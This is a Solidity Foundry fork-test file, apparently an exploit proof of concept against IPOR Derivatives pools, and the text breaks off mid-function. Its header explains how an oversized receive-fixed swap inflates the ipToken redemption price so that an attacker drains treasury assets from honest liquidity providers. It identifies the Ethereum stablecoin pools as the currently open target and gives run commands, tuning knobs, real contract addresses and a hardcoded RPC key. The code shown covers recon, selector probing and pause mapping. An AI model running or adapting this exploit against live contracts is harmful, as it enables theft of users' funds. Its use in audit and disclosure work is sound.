// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// ============================================================================
//  IPOR Derivatives — mainnet-fork PoC  (v3.4)
//
//  Bug under test
//  --------------
//  Closing a swap clamps the trader's PnL to his collateral
//  (SwapLogicBaseV1.normalizePnlValue), but the SOAP figure that feeds
//  AmmLib.getExchangeRate is NOT clamped and is linear in the swap NOTIONAL.
//  One oversized receive-fixed swap therefore books a phantom LP liability
//  that grows with time; ipToken redemption price (= LP balance / ipToken
//  supply) inflates; whoever holds ipTokens redeems them against the real
//  treasury assets.
//
//  What v3.3 changes vs v3.2 (v3.2 was run on the live forks, block 26,310,577)
//  ---------------------------------------------------------------------------
//  * the pause map is per SELECTOR, not per protocol. Measured by the operator's
//    v3.3 run (block 26,310,668 Arb / 26,310,671 Eth / 53,317,684 Base):
//    Arbitrum USDC   -> all 6 open selectors PAUSED
//    Arbitrum wstETH -> 6-arg PAUSED; the 5-arg ones are NOT ROUTED at all
//                       (Arbitrum wstETH is AmmOpenSwapServiceWstEthBaseV1, which
//                       takes `inputAsset`: 0x1253b3ae / 0x70a7394c / 0x240e3328
//                       receive-fixed, 0x804e488a / 0xb814f9c0 / 0x01eb1f71 pay-fixed;
//                       0x859c1a6a/0x83e7d402/0xb95ba8f3/0xdc660afa/0xb3f2a286/0xed157264
//                       are the Ethereum-flavour hashes and answer IPOR_012)
//    Ethereum USDC/USDT/DAI -> fully OPEN          <- the only live surface
//    Base, Arbitrum USDT/DAI -> paused / no usable pool ("open" flags on the
//                       non-existent pools are just the default-false mapping)
//    => the operational run must be CHAIN=eth. test_1_attack still walks EVERY
//    pool on the chain (deepest first, TARGET=<tag> to force one) and only
//    gives up when nothing on the chain opens.
//  * v3.4 fixes two defects found while reading the v3.3 revert logs:
//    - _attackOn() fell out of the function with success=false on the PROFIT
//      branch (the `return true` sat inside the LOSS branch), so a successful
//      pool was reported as "no open swap path";
//    - the close attempt always used closeSwapsUsdc, which does not exist for
//      the USDT/DAI pools (the asset name is part of the selector);
//    - the arity order is now derived from the pool (6-arg first for Arbitrum
//      wstETH / Arbitrum-Base USDC, 5-arg first for the Ethereum stables)
//      instead of burning a guaranteed-IPOR_012 call first.
//    walks EVERY pool on the chain (deepest first, TARGET=<tag> to force one)
//    and only gives up when nothing on the chain opens.
//  * _depth() falls back to the legacy AmmLib formula
//        LP = storage.liquidityPool + vaultActual - storage.vault
//    for the Ethereum treasuries (AmmTreasury, no getLiquidityPoolBalance), and
//    prints which source it used. Never quote a depth labelled
//    "rate*supply (soap-contaminated)" — that is the attacked quantity.
//  * a second, honest LP is used as the victim: it deposits before the attack
//    and redeems after it, so the loss is a measured number, not an inference.
//  * test_3_pause prints the pause state of ALL 18 open entry points plus the
//    liquidity/close ones, and proves whether the pause can be side-stepped by
//    calling the open-swap service directly (it cannot: the service reads the
//    message-signer slot of its own storage, which is empty).
//  * SwapData struct fixed to the real AmmTypes.Swap field order.
//
//  Run (on a machine with foundry + mainnet RPCs). Ethereum is the chain where
//  the open path exists today, Arbitrum is the chain the audit brief named.
//  ---------------------------------------------------------------------------
//    export ETH_RPC=https://eth-mainnet.g.alchemy.com/v2/KEY
//    export ARB_RPC=https://arb-mainnet.g.alchemy.com/v2/KEY
//    export BASE_RPC=https://base-mainnet.g.alchemy.com/v2/KEY
//    CHAIN=eth TARGET=USDC forge test --match-contract IporFork --match-test test_1_attack -vv
//    CHAIN=arb TARGET=wstETH forge test --match-contract IporFork --match-test test_1_attack -vv
//
//  Individual steps (read the first three before believing the fourth)
//    forge test --match-contract IporFork --match-test test_2_probe      -vv
//    forge test --match-contract IporFork --match-test test_3_pause      -vv
//    forge test --match-contract IporFork --match-test test_4_all_chains -vv
//    forge test --match-contract IporFork --match-test test_0_recon      -vv
//    forge test --match-contract IporFork --match-test test_1_attack     -vv
//
//  Knobs (optional, wad unless stated)
//    TARGET=USDC|wstETH   pick the pool (default: the biggest one by USD)
//    ATK_LP=<wad>         attacker LP deposit      (default: depth/2)
//    HONEST=<wad>         victim LP deposit        (default: depth/4)
//    TOTAL=<wad>          swap collateral          (default: depth/2)
//    LEV=<wad>            leverage                 (default: 1000e18)
//    TENOR=28|60|90       swap tenor               (default: 90, falls back if paused)
//    DAYS=<n>             days held before redeem  (default: tenor days)
//    CHUNKS=<n>           redemption chunks        (default: 20)
//    FORK_BLOCK=<n>       pin the fork block
//
//  Chains: Arbitrum (42161) default, Ethereum (1) and Base (8453) wired.
//    ARB_RPC / ETH_RPC / BASE_RPC, CHAIN=arb|eth|base
//
//  One test-only cheat, disclosed on purpose: risk indicators must be signed by
//  IPOR's off-chain key. Nobody can forge that key inside a fork, so the test
//  points the verifier at a key it owns (setMessageSigner, owner-only). In
//  production the same signed payload is served by IPOR's public API to any
//  caller, so the attacker needs no privilege there — see REPORT.md.
// ============================================================================

import {Test, console2} from "forge-std/Test.sol";

/// @dev mirrors AmmTypes.RiskIndicatorsInputs
struct RiskInputs {
    uint256 maxCollateralRatio;
    uint256 maxCollateralRatioPerLeg;
    uint256 maxLeveragePerLeg;
    int256 baseSpreadPerLeg;
    uint256 fixedRateCapPerLeg;
    uint256 demandSpreadFactor;
    uint256 expiration;
    bytes signature;
}

struct CloseRiskInputs {
    RiskInputs payFixed;
    RiskInputs receiveFixed;
}

/// @dev mirrors AmmTypes.Swap exactly (field order matters for decoding)
struct SwapData {
    uint256 id;
    address buyer;
    uint256 openTimestamp;
    uint256 tenor;
    uint256 idsIndex;
    uint256 collateral;
    uint256 notional;
    uint256 ibtQuantity;
    uint256 fixedInterestRate;
    uint256 liquidationDepositAmount;
    uint256 state;
}

/// @dev mirrors AmmTypesBaseV1.Balance
struct AmmBalance {
    uint256 totalCollateralPayFixed;
    uint256 totalCollateralReceiveFixed;
    uint256 liquidityPool;
    uint256 vault;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC4626Like {
    function maxWithdraw(address owner) external view returns (uint256);
    function asset() external view returns (address);
}

/// @dev AmmTreasuryBaseV2 public getters (+ legacy getConfiguration fallback)
interface ITreasury {
    function getLiquidityPoolBalance() external view returns (uint256);
    function ammAssetManagement() external view returns (address);
    function getConfiguration()
        external
        view
        returns (address asset, uint256 decimals, address ammStorage, address assetManagement, address router);
}

interface IAmmStorageLike {
    function getBalance() external view returns (AmmBalance memory);
}

interface IAmmStorageSwap {
    function getSwap(uint8 direction, uint256 swapId) external view returns (SwapData memory);
}

/// @dev direct (non-router) open-swap service — used only to test pause bypass
interface IOpenSwapDirect {
    function openSwapReceiveFixed90daysUsdc(
        address beneficiary,
        address inputAsset,
        uint256 inputAssetTotalAmount,
        uint256 acceptableFixedInterestRate,
        uint256 leverage,
        RiskInputs calldata ri
    ) external returns (uint256);
}

interface IRouter {
    function owner() external view returns (address);
    function setMessageSigner(address) external;
    function getIpTokenExchangeRate(address asset) external view returns (uint256);
    function paused(bytes4 functionSig) external view returns (uint256);
    function unpause(bytes4[] calldata) external;
    function pause(bytes4[] calldata) external;

    // liquidity (entry point differs per chain)
    function provideLiquidityUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdcToAmmPoolUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdt(address beneficiary, uint256 amount) external;
    function provideLiquidityDai(address beneficiary, uint256 amount) external;
    function provideLiquidityWstEth(address beneficiary, uint256 amount) external;

    function redeemFromAmmPoolUsdc(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolUsdt(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolDai(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipAmount) external;

    function closeSwapsUsdc(
        address beneficiary,
        uint256[] memory payFixedSwapIds,
        uint256[] memory receiveFixedSwapIds,
        CloseRiskInputs calldata ri
    ) external;

    function closeSwapsWstEth(
        address beneficiary,
        uint256[] memory payFixedSwapIds,
        uint256[] memory receiveFixedSwapIds,
        CloseRiskInputs calldata ri
    ) external;
}

contract IporForkTest is Test {
    // Alchemy demo key used earlier by the operator; override with ARB_RPC.
    string constant RPC_ARB_FALLBACK =
        "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";
    uint256 constant PRICE_ETH = 3850e18; // conservative wstETH/ETH ~1.06 x ETH 3600

    address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_WSTETH = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant ETH_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ETH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant BASE_WSTETH = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;

    uint8 constant K_STABLE = 0;
    uint8 constant K_WSTETH = 1;

    uint8 constant LP_LEGACY = 0; // Ethereum stable pools
    uint8 constant LP_USDC_V1 = 1; // Arbitrum / Base USDC
    uint8 constant LP_WSTETH = 2;

    uint8 constant DIR_PAY_FIXED = 0; // AmmTypes.SwapDirection.PAY_FIXED_RECEIVE_FLOATING
    uint8 constant DIR_RECEIVE_FIXED = 1; // AmmTypes.SwapDirection.PAY_FLOATING_RECEIVE_FIXED

    struct Pool {
        string name;
        string tag;
        string assetTag; // "Usdc" / "WstEth" / "Usdt" / "Dai"
        address asset;
        address ipToken;
        address treasury;
        uint8 kind;
        uint8 decimals;
        uint8 lpStyle;
        address ammStorage;
        address poolsService;
        address openSwapService;
    }

    IRouter router;
    uint256 signerPk = 0xA11CE;
    address signer;

    // actors
    address attacker = address(0xA77ACC);
    address honest = address(0x40E57);

    function setUp() public {
        string memory rpc = _pickRpc();
        uint256 fb = _envOr("FORK_BLOCK", 0);
        if (fb > 0) {
            vm.createSelectFork(rpc, fb);
        } else {
            vm.createSelectFork(rpc);
        }
        signer = vm.addr(signerPk);
    }

    // ------------------------------------------------------------- chain set-up
    function _pickRpc() internal view returns (string memory) {
        (string memory direct, bool hasDirect) = _envS("RPC_URL");
        if (hasDirect) return direct;

        (string memory c, bool hasChain) = _envS("CHAIN");
        if (hasChain) {
            if (_eq(c, "eth") || _eq(c, "ethereum") || _eq(c, "mainnet")) {
                (string memory e, bool he) = _envS("ETH_RPC");
                require(he, "CHAIN=eth needs ETH_RPC");
                return e;
            }
            if (_eq(c, "base")) {
                (string memory b, bool hb) = _envS("BASE_RPC");
                require(hb, "CHAIN=base needs BASE_RPC");
                return b;
            }
            (string memory a, bool ha) = _envS("ARB_RPC");
            require(ha, "CHAIN=arb needs ARB_RPC");
            return a;
        }

        (string memory arb, bool hArb) = _envS("ARB_RPC");
        if (hArb) return arb;
        (string memory eth, bool hEth) = _envS("ETH_RPC");
        if (hEth) return eth;
        (string memory base, bool hBase) = _envS("BASE_RPC");
        if (hBase) return base;
        return RPC_ARB_FALLBACK;
    }

    function _pools() internal returns (Pool[] memory p) {
        if (block.chainid == 42161) {
            router = IRouter(0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db);
            p = new Pool[](2);
            // solhint-disable-next-line max-line-length
            p[0] = Pool("USDC  / Arbitrum", "USDC", "Usdc", ARB_USDC, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167, 0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, K_STABLE, 6, LP_USDC_V1, 0x52395372f2355491bC823d752bdb347807864308, 0xc08610f885C606e622C910D902356257998D6217, 0x5D9094baDc927b82a78BA095A5BC394F166aA27b);
            p[1] = Pool("wstETH/ Arbitrum", "wstETH", "WstEth", ARB_WSTETH, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C, 0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, K_WSTETH, 18, LP_WSTETH, 0x326804339eC2a210e5f9246F4959aE50961c5C28, 0x2e53879feb7F9BC8E97d1bcc848356F781402b6c, 0x7138B130F255fa4B65dFE6DEA9ade89dBF1E6461);
        } else if (block.chainid == 1) {
            router = IRouter(0x16d104009964e694761C0bf09d7Be49B7E3C26fd);
            p = new Pool[](3);
            p[0] = Pool("USDC  / Ethereum", "USDC", "Usdc", ETH_USDC, 0x7c0e72f431FD69560D951e4C04A4de3657621a88, 0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, K_STABLE, 6, LP_LEGACY, address(0), address(0), address(0));
            p[1] = Pool("USDT  / Ethereum", "USDT", "Usdt", ETH_USDT, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6, 0x28BC58e600eF718B9E97d294098abecb8c96b687, K_STABLE, 6, LP_LEGACY, address(0), address(0), address(0));
            p[2] = Pool("DAI   / Ethereum", "DAI", "Dai", ETH_DAI, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8, 0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, K_STABLE, 18, LP_LEGACY, address(0), address(0), address(0));
        } else if (block.chainid == 8453) {
            router = IRouter(0x21d337eBF86E584e614ecC18A2B1144D3C375918);
            p = new Pool[](2);
            p[0] = Pool("USDC  / Base", "USDC", "Usdc", BASE_USDC, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30, 0x1AbA7a3C3bec8139B10a4807087084064A454a24, K_STABLE, 6, LP_USDC_V1, address(0), 0x786AFBbb9876b193F8F01B04A2c08861551d02d0, 0xdF884ccEf3F18b107e0B9423aaE3b605461bB54d);
            p[1] = Pool("wstETH/ Base", "wstETH", "WstEth", BASE_WSTETH, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af, 0x09388e18d5C331449C6eF636726dD1fd007b8DDf, K_WSTETH, 18, LP_WSTETH, address(0), 0x0eb64F28E54a1c5F5aD98b54F951496d9A330887, 0xFbE094Bcc8731fa45Eb88850592248e5D6aC9472);
        } else {
            revert("fork Arbitrum (42161), Ethereum (1) or Base (8453)");
        }
    }

    // ----------------------------------------------------------------- helpers
    function toInt256(uint256 x) internal pure returns (int256) {
        require(x <= uint256(type(int256).max), "int overflow");
        return int256(x);
    }

    function _eq(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }

    function _sel(string memory s) internal pure returns (bytes4) {
        return bytes4(keccak256(bytes(s)));
    }

    function _wad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a * 10 ** (18 - d);
    }

    function _fromWad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a / 10 ** (18 - d);
    }

    function _isEth(address a) internal pure returns (bool) {
        return a == ARB_WSTETH || a == BASE_WSTETH;
    }

    function _usd(Pool memory p, uint256 wad) internal pure returns (uint256) {
        return _isEth(p.asset) ? (wad * PRICE_ETH) / 1e18 : wad;
    }

    /// @dev forge-version-proof env readers (try/catch instead of envExists)
    function _envU(string memory k) internal view returns (uint256 v, bool ok) {
        try vm.envUint(k) returns (uint256 x) {
            return (x, true);
        } catch {
            return (0, false);
        }
    }

    function _envS(string memory k) internal view returns (string memory v, bool ok) {
        try vm.envString(k) returns (string memory x) {
            return (x, true);
        } catch {
            return ("", false);
        }
    }

    function _envOr(string memory k, uint256 def) internal view returns (uint256 v) {
        (uint256 x, bool ok) = _envU(k);
        v = ok ? x : def;
    }

    /// @dev decode the revert payload. IPOR reverts with `revert("IPOR_012")`,
    ///      i.e. Error(string), so the first 4 bytes are 0x08c379a0 and NOT the
    ///      error code - comparing bytes4(ret) with keccak("IPOR_012") (what
    ///      v3.3 did) can never match and made every "not routed" look like a
    ///      later revert. Decode the string properly instead.
    function _code(bytes memory ret) internal pure returns (string memory) {
        if (ret.length < 4) return "(none)";
        if (bytes4(ret) != 0x08c379a0) {
            return bytes4(ret) == 0x4e487b71 ? "Panic" : "custom-error";
        }
        if (ret.length < 68) return "(short)";
        uint256 len;
        assembly {
            len := mload(add(ret, 68))
        }
        if (len > ret.length - 68) len = ret.length - 68;
        bytes memory out = new bytes(len);
        for (uint256 i; i < len; i++) out[i] = ret[68 + i];
        return string(out);
    }

    function _logReason(bytes memory ret) internal pure {
        console2.log("   revert:", _code(ret));
    }

    /// @dev Is `sel` actually wired into this router, and is it paused?
    ///      The router answers IPOR_015 for a routed-but-paused selector and
    ///      IPOR_012 for a selector it does not know at all, so an one-shot call
    ///      with no arguments separates the three cases without any guessing.
    ///      (A pause flag of 0 on a selector that is not routed is meaningless:
    ///      the mapping simply has no entry.)
    function _routed(bytes4 sel) internal returns (string memory verdict, bool usable) {
        (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sel));
        if (ok) return ("ROUTED", true);
        string memory c = _code(ret);
        if (_eq(c, "IPOR_012")) return ("not routed (IPOR_012)", false);
        if (_eq(c, "IPOR_015")) return ("routed but PAUSED (IPOR_015)", false);
        if (_eq(c, "IPOR_014")) return ("routed but globally PAUSED", false);
        return (string.concat("routed (", c, ")"), true);
    }

    /// @dev idle cash + asset-manager assets of the treasury, both as wad
    function _cash(Pool memory p) internal view returns (uint256 idleWad, uint256 vaultWad) {
        idleWad = _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
        address am;
        try ITreasury(p.treasury).ammAssetManagement() returns (address a) {
            am = a;
        } catch {
            try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address, address a, address) {
                am = a;
            } catch {}
        }
        if (am != address(0)) {
            try IERC4626Like(am).maxWithdraw(p.treasury) returns (uint256 assets) {
                vaultWad = _wad(assets, p.decimals);
            } catch {}
        }
    }

    /// @dev ammStorage for a pool: from the table, or from AmmTreasury.getConfiguration()
    function _ammStorageOf(Pool memory p) internal view returns (address) {
        if (p.ammStorage != address(0)) return p.ammStorage;
        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
            return st;
        } catch {}
        return address(0);
    }

    /// @dev LP balance (wad) as the swap engine sees it, i.e. WITHOUT soap.
    ///      1. AmmTreasuryBaseV2.getLiquidityPoolBalance() when it exists;
    ///      2. otherwise the AmmLib.getAccruedBalance() formula, which is what the
    ///         legacy Ethereum treasuries use:
    ///           LP = storage.liquidityPool + vaultActual - storage.vault
    ///      3. last resort: rate * supply (= LP - soap, contaminated by the attack).
    function _depth(Pool memory p) internal view returns (uint256 d, string memory src) {
        try ITreasury(p.treasury).getLiquidityPoolBalance() returns (uint256 v) {
            if (v > 0) return (v, "getLiquidityPoolBalance");
        } catch {}
        address st = _ammStorageOf(p);
        if (st != address(0)) {
            try IAmmStorageLike(st).getBalance() returns (AmmBalance memory b) {
                (, uint256 vaultActual) = _cash(p);
                int256 lp = toInt256(b.liquidityPool) + toInt256(vaultActual) - toInt256(b.vault);
                if (lp > 0) return (uint256(lp), "AmmLib accrued: liquidityPool + vaultActual - vault");
            } catch {}
        }
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 rate) {
            d = (rate * IERC20Like(p.ipToken).totalSupply()) / 1e18;
            src = "rate*supply (soap-contaminated)";
        } catch {}
    }

    function _rate(Pool memory p) internal view returns (uint256) {
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 r) {
            return r;
        } catch {
            return 0;
        }
    }

    function _provideSel(Pool memory p) internal pure returns (bytes4) {
        if (p.lpStyle == LP_WSTETH) return IRouter.provideLiquidityWstEth.selector;
        if (p.lpStyle == LP_USDC_V1) return IRouter.provideLiquidityUsdcToAmmPoolUsdc.selector;
        if (_eq(p.assetTag, "Usdt")) return IRouter.provideLiquidityUsdt.selector;
        if (_eq(p.assetTag, "Dai")) return IRouter.provideLiquidityDai.selector;
        return IRouter.provideLiquidityUsdc.selector;
    }

    function _redeemSel(Pool memory p) internal pure returns (bytes4) {
        if (p.kind == K_WSTETH) return IRouter.redeemFromAmmPoolWstEth.selector;
        if (_eq(p.assetTag, "Usdt")) return IRouter.redeemFromAmmPoolUsdt.selector;
        if (_eq(p.assetTag, "Dai")) return IRouter.redeemFromAmmPoolDai.selector;
        return IRouter.redeemFromAmmPoolUsdc.selector;
    }

    /// @dev closeSwaps<T> selector: the name encodes the asset even though the
    ///      argument list is identical, so it must not be hard-coded to Usdc.
    function _closeSel(Pool memory p) internal pure returns (bytes4) {
        return
            _sel(
                string.concat(
                    "closeSwaps",
                    p.assetTag,
                    "(address,uint256[],uint256[],((uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes),(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes)))"
                )
            );
    }

    /// @dev Which arity does this pool's own open-swap service expose?
    ///      Arbitrum/Base USDC + Arbitrum wstETH services take an extra
    ///      `inputAsset` word (6-arg); the Ethereum stable service does not
    ///      (5-arg). Returned as the *preferred* order, the other one is still
    ///      tried afterwards because the pause map cannot tell us which
    ///      selectors are actually routed.
    function _preferInputAsset(Pool memory p) internal pure returns (bool) {
        if (_eq(p.assetTag, "WstEth")) return true;
        if (p.lpStyle == LP_USDC_V1) return true;
        return false;
    }

    function _tenorTag(uint256 tenorIdx) internal pure returns (string memory) {
        if (tenorIdx == 0) return "28days";
        if (tenorIdx == 1) return "60days";
        return "90days";
    }

    /// @dev selector of openSwapReceiveFixed<T>days<Asset>(...)
    ///      withInputAsset = true  -> V1 flavour (Arbitrum / Base)
    ///      withInputAsset = false -> legacy flavour (Ethereum)
    function _openSel(
        string memory assetTag,
        uint256 tenorIdx,
        bool withInputAsset,
        uint256 dir
    ) internal pure returns (bytes4) {
        string memory head = string.concat(
            "openSwap",
            dir == DIR_RECEIVE_FIXED ? "ReceiveFixed" : "PayFixed",
            _tenorTag(tenorIdx),
            assetTag,
            "("
        );
        string memory tail = withInputAsset
            ? "address,address,uint256,uint256,uint256,(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes))"
            : "address,uint256,uint256,uint256,(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes))";
        return _sel(string.concat(head, tail));
    }

    function _isPaused(bytes4 sel) internal view returns (bool) {
        try router.paused(sel) returns (uint256 v) {
            return v != 0;
        } catch {
            return false;
        }
    }

    /// @dev signature layout from RiskIndicatorsValidatorLib.hashRiskIndicatorsInputs
    function _sign(RiskInputs memory r, address asset, uint256 tenor, uint256 dir) internal view returns (bytes memory) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                r.maxCollateralRatio,
                r.maxCollateralRatioPerLeg,
                r.maxLeveragePerLeg,
                r.baseSpreadPerLeg,
                r.fixedRateCapPerLeg,
                r.demandSpreadFactor,
                r.expiration,
                asset,
                tenor,
                dir
            )
        );
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(rr, s, v);
    }

    function _risk(uint256 lev) internal view returns (RiskInputs memory ri) {
        ri = RiskInputs({
            maxCollateralRatio: 0.90e18,
            maxCollateralRatioPerLeg: 0.90e18,
            maxLeveragePerLeg: lev,
            baseSpreadPerLeg: 0.001e18,
            fixedRateCapPerLeg: 0.05e18,
            demandSpreadFactor: 280,
            expiration: block.timestamp + 1 hours,
            signature: ""
        });
    }

    /// @dev acceptableFixedInterestRate: 0 for receive-fixed (no floor needed),
    ///      100% for pay-fixed (the service requires acceptable > 0 and >= offered)
    function _openCalldata(
        Pool memory p,
        uint256 tenorIdx,
        bool withInputAsset,
        uint256 dir,
        uint256 amt,
        uint256 lev,
        RiskInputs memory ri
    ) internal view returns (bytes memory) {
        bytes4 sel = _openSel(p.assetTag, tenorIdx, withInputAsset, dir);
        uint256 acceptable = dir == DIR_RECEIVE_FIXED ? 0 : 1e18;
        if (withInputAsset) {
            return abi.encodeWithSelector(sel, attacker, p.asset, amt, acceptable, lev, ri);
        }
        return abi.encodeWithSelector(sel, attacker, amt, acceptable, lev, ri);
    }

    function _pick(Pool[] memory ps) internal view returns (uint256 idx, uint256 bestUsd) {
        for (uint256 i; i < ps.length; i++) {
            (uint256 d,) = _depth(ps[i]);
            uint256 usd = _usd(ps[i], d);
            if (usd > bestUsd) {
                bestUsd = usd;
                idx = i;
            }
        }
    }

    function _target(Pool[] memory ps) internal view returns (uint256 idx) {
        (idx,) = _pick(ps);
        (string memory t, bool ok) = _envS("TARGET");
        if (ok) {
            for (uint256 i; i < ps.length; i++) {
                if (keccak256(bytes(t)) == keccak256(bytes(ps[i].tag))) idx = i;
            }
        }
    }

    // ============================================================ 0. recon
    function test_0_recon() public {
        Pool[] memory ps = _pools();
        console2.log("chain", block.chainid, "block", block.number);
        console2.log("router", address(router));
        console2.log("owner", router.owner());
        console2.log("");
        for (uint256 i; i < ps.length; i++) {
            Pool memory p = ps[i];
            (uint256 idle, uint256 vault) = _cash(p);
            (uint256 d, string memory src) = _depth(p);
            uint256 supply = IERC20Like(p.ipToken).totalSupply();
            uint256 rate = _rate(p);
            console2.log("--------------------------------------------------");
            console2.log(p.name);
            console2.log("  asset           ", p.asset);
            console2.log("  ipToken         ", p.ipToken);
            console2.log("  treasury        ", p.treasury);
            console2.log("  treasury idle (wad)", idle);
            console2.log("  asset mgr     (wad)", vault);
            console2.log("  LP balance    (wad)", d);
            console2.log("  depth source        ", src);
            console2.log("  ipToken supply (wad)", supply);
            console2.log("  exchange rate (wad)", rate);
            console2.log("  rate*supply (wad)   ", (rate * supply) / 1e18);
            console2.log("  LP balance USD      ", _usd(p, d));
            console2.log("  redeemable USD      ", _usd(p, idle + vault));
            // what can be opened right now?
            bool pref = _preferInputAsset(p);
            console2.log("  own arity:", pref ? "6-arg" : "5-arg");
            for (uint256 t; t < 3; t++) {
                (string memory rf,) = _routed(_openSel(p.assetTag, t, pref, DIR_RECEIVE_FIXED));
                (string memory pf,) = _routed(_openSel(p.assetTag, t, pref, DIR_PAY_FIXED));
                console2.log(
                    string.concat("  ", _tenorTag(t), "  receiveFixed ", rf, "   payFixed ", pf)
                );
            }
            (string memory pv,) = _routed(_provideSel(p));
            (string memory rv,) = _routed(_redeemSel(p));
            console2.log(string.concat("  provideLiquidity ", pv));
            console2.log(string.concat("  redeemFromPool   ", rv));
        }
    }

    // ============================================================ 2. selector probe
    /// @notice the only trustworthy availability table: for every pool on this
    ///         chain, does the router actually route the open/redeem/provide
    ///         selector, and if so is it paused. "paused = no" on a selector the
    ///         router does not know is a ghost (the pause mapping has no entry).
    function test_2_probe() public {
        Pool[] memory ps = _pools();
        // fail fast if a signature string above is malformed
        assertEq(_openSel("Usdc", 2, true, DIR_RECEIVE_FIXED), bytes4(0x3696578d), "usdc 90d receiveFixed 6arg");
        assertEq(_openSel("Usdc", 2, false, DIR_RECEIVE_FIXED), bytes4(0xed2b4a54), "usdc 90d receiveFixed 5arg");
        assertEq(_openSel("WstEth", 2, true, DIR_RECEIVE_FIXED), bytes4(0x1253b3ae), "wsteth 90d receiveFixed 6arg");
        assertEq(_openSel("WstEth", 2, false, DIR_RECEIVE_FIXED), bytes4(0xb95ba8f3), "wsteth 90d receiveFixed 5arg");
        assertEq(_openSel("Usdc", 2, true, DIR_PAY_FIXED), bytes4(0x5753d5bf), "usdc 90d payFixed 6arg");
        assertEq(_closeSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), K_STABLE, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0xa5450264), "closeSwapsUsdc");
        assertEq(_provideSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), K_STABLE, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0x87b3c417), "provide V1 selector");

        console2.log("chain", block.chainid, "router", address(router));
        for (uint256 i; i < ps.length; i++) {
            Pool memory p = ps[i];
            console2.log("");
            console2.log("pool", p.name);
            bool pref = _preferInputAsset(p);
            console2.log("  own arity is", pref ? "6-arg (with inputAsset)" : "5-arg (legacy)");
            for (uint256 d; d < 2; d++) {
                uint256 dir = d == 0 ? DIR_RECEIVE_FIXED : DIR_PAY_FIXED;
                for (uint256 t; t < 3; t++) {
                    bytes4 own = _openSel(p.assetTag, t, pref, dir);
                    (string memory v, bool usable) = _routed(own);
                    console2.log(
                        string.concat(
                            "  ",
                            dir == DIR_RECEIVE_FIXED ? "receiveFixed " : "payFixed     ",
                            _tenorTag(t),
                            pref ? " 6arg " : " 5arg ",
                            usable ? "USABLE" : "closed",
                            " -> ",
                            v
                        )
                    );
                    if ((!usable) && t == 2) {
                        bytes4 alt = _openSel(p.assetTag, t, !pref, dir);
                        (string memory v2,) = _routed(alt);
                        console2.log(
                            string.concat("     other arity ", pref ? "5arg: " : "6arg: ", v2)
                        );
                    }
                }
            }
            (string memory pv,) = _routed(_provideSel(p));
            (string memory rv,) = _routed(_redeemSel(p));
            console2.log(string.concat("  provideLiquidity -> ", pv));
            console2.log(string.concat("  redeemFromPool   -> ", rv));
        }
    }

    // ============================================================ 3. pause map
    /// @notice prints the pause state of every open/liquidity/close entry point
    ///         and proves the pause cannot be bypassed through the raw service.
    function test_3_pause() public {
        Pool[] memory ps = _pools();
        console2.log("chain", block.chainid, "router", address(router));
        console2.log("");

        console2.log("pause flags below are ONLY meaningful for a routed selector;");
        console2.log("test_2_probe prints which selectors this router actually routes.");
        console2.log("");
        string[4] memory tags = ["Usdc", "WstEth", "Usdt", "Dai"];
        string[2] memory dirs = ["ReceiveFixed", "PayFixed"];
        for (uint256 a; a < tags.length; a++) {
            for (uint256 d; d < 2; d++) {
                for (uint256 t; t < 3; t++) {
                    uint256 dir = d == 0 ? DIR_RECEIVE_FIXED : DIR_PAY_FIXED;
                    bytes4 s6 = _openSel(tags[a], t, true, dir);
                    bytes4 s5 = _openSel(tags[a], t, false, dir);
                    bool p6 = _isPaused(s6);
                    bool p5 = _isPaused(s5);
                    console2.log(
                        string.concat(
                            "openSwap",
                            dirs[d],
                            _tenorTag(t),
                            tags[a],
                            "  6arg ",
